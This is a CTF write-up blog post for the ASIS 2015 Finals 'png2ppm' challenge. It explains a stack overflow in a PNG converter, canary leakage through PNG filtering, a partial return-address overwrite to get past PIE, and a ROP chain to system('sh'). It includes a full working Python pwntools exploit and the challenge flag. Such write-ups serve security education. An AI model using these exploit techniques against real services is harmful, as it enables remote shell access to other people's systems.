---
layout: post
title: "ASIS 2015 Finals: png2ppm"
modified: 2015-10-14
tags: asis, asis2015finals, pwn
---

This challenge was an image conversion service which expected a PNG file and converted into a PPM file. PPM is a simple text-based image format, here is the wikipedia page describing it: https://en.wikipedia.org/wiki/Netpbm_format

The main vulnerability was a stack buffer overflow, because it allocated a buffer with the size of width * height * bitsPerPixel and copied the PNG's decompressed zlib data (except the filter field) to the buffer which does not respected the allocated buffer's size.

The main problem was that we also overwrote the stack canary and it was a 64-bit ASLR-enabled PIE binary (as the challenge website stated so) which did not fork, so new canary generated for every new connection:

![alt]({{ site.url }}/images/asis2015finals/png2ppm1.png)

Luckily there was an other vulnerability: the PNG file format uses a method called Filtering which can help to reduce the size of the file by only storing the differences with the pixel to the left or the pixel above etc. You can read about it here: https://en.wikipedia.org/wiki/Portable_Network_Graphics#Filtering

So if we tried to read the previous row in first row, then it read before our buffer. This way we could read the stack cookie from the previous function call. Although I am not 100% sure, but I think the binary was compiled with -fstack-protector-all, because there was stack cookie in every function. In this case maybe this paranoid setting caused more harm than good... :)

I had to experiment a bit with the width / height / with or without alpha channel options. As I had to switch between the "copy the above line" (2) filter (for the stack cookie) and "copy the exact values" (0) filter (for the return address). Finally I created a 6*1 PNG with alpha channel.

This way we could overwrite the stack cookie and we had RIP control. BUT as the binary was a PIE binary we had not fix addresses where we could jump. Or do we?

Basically the return address points to a valid memory address, to the next instruction after the sub_1560 call. So if we partially overwrite the return address, we can jump somewhere in the png2ppm binary.

Practically I jumped to the program's start again as at this point I already had a lot of leaked addresses as the result of the conversion contained the stack cookie, an address from the stack, and an address from the png2ppm binary (although I had to mix the address bytes from the pixelmap and the alpha map, because the conversion divided the values into two different files).

Only one thing separated me from getting a shell: a libc address :)

Because I know the program's base address at this point, I could jump to the puts PLT and print out the GOT table. So I got the puts function's libc address and calculated the system's address from it.

So in the next ROP chain I could call the system with "sh". For this I had to calculate the "sh" string's address from the stack (I could calculate this, because I already had a stack address leak).

Because of the partial overwrite, I also overwrote 4 bits from the ASLR random part, so for the real server I had to run the exploit multiple times to hit the correct address with a 1/16 change (locally I debugged it with disabled ASLR).

Finally I could print the flag out:
{% highlight text %}
ASIS{487e532d3aae05f1717f46104ba4ebf6}
{% endhighlight %}

### Exploit code

{% highlight python %}
import sys
import binascii
import struct
import zlib
from pwn import *
from time import sleep

for iTry in xrange(64):
    print "Try #%d / 64" % (iTry + 1)
    try:
        p = remote('185.106.120.22', 1337)

        time.sleep(0.5)

        def getChunk(data):
            return struct.pack('>I', len(data) - 4) + data + struct.pack('>i', binascii.crc32(data))

        def convertPng(width, height, plain):
            pngHdr = "\x89PNG\x0d\x0a\x1a\x0a";
            iHdr = getChunk("IHDR" + struct.pack('>II', width, height) + "\x08\x06\x00\x00\x00")
            iDat = getChunk("IDAT" + zlib.compress(plain))
            iEnd = getChunk("IEND")
            pngData = pngHdr + iHdr + iDat + iEnd
            p.send(str(len(pngData)) + '\n' + pngData)

        #system = "\x2e\x5d"
        mainPart = "\x79\x5a"

        convertPng(6, 1, ("\x02" + "\x00" * 24) * 6 + "\x00"*9 + mainPart)

        p.recvuntil('\n255\n')
        leakLine1 = p.recvline().strip()
        p.recvuntil('\n255\n')
        leakLine2 = p.recvline().strip()
        print "Leak lines = %r, %r" % (leakLine1, leakLine2)

        leakStr1 = ''.join([chr(int(x)) for x in leakLine1.split(' ')])
        leakStr2 = ''.join([chr(int(x)) for x in leakLine2.split(' ')])
        cookieLeak = u64(leakStr1[0:3]+leakStr2[0]+leakStr1[3:6]+leakStr2[1])
        stackBase = u64(leakStr1[6:9]+leakStr2[2]+leakStr1[9:12]+leakStr2[3]) - 0x1fc60 - 0x480
        prgBase = u64(leakStr1[12:15]+leakStr2[4]+leakStr1[15:18]+leakStr2[5]) - 0x184e
        print "Leaks: cookie = 0x%016x, stack = 0x%016x, prg = 0x%016x" % (cookieLeak, stackBase, prgBase)

        puts = prgBase + 0xa20
        putsGot = prgBase + 0x202f48
        popRdi = prgBase + 0x1b53
        main = prgBase + (((ord(mainPart[1]) - 0x40) << 8) + ord(mainPart[0]))
        rbx = "BBBBBBBB"
        rbp = "CCCCCCCC"
        ret = "DDDDDDDD"

        convertPng(64, 1, "\x00"*(1+64*4)+"\x00" + "X"*80 + p64(cookieLeak) + "XXXXXXXX"+rbx+rbp+p64(popRdi)+p64(putsGot)+p64(puts)+p64(main))
        p.recvuntil('\n255\n')
        p.recvuntil('\n255\n')
        p.recvline()
        putsLeak = u64(p.recvline()[:-1]+'\x00'*2)
        print "puts leak = 0x%016x" % putsLeak

        putsLocal = 0x7ffff786be30
        systemLocal = 0x7ffff7842640
        remoteSystem = putsLeak - putsLocal + systemLocal

        stackBaseLocal = 0x7ffffffde000
        binShLocal = 0x7fffffffe0e8
        binShRemote = stackBase - stackBaseLocal + binShLocal

        convertPng(64, 1, "\x00"*(1+64*4)+"\x00" + "X"*80 + p64(cookieLeak) + "XXXXXXXX"+rbx+rbp+p64(popRdi)+p64(binShRemote)+p64(remoteSystem)+"sh\x00")

        p.send('cat flag\n')
        p.interactive()
        break
    except:
        try:
            p.close()
        except:
            pass
        print "Fail!"
{% endhighlight %}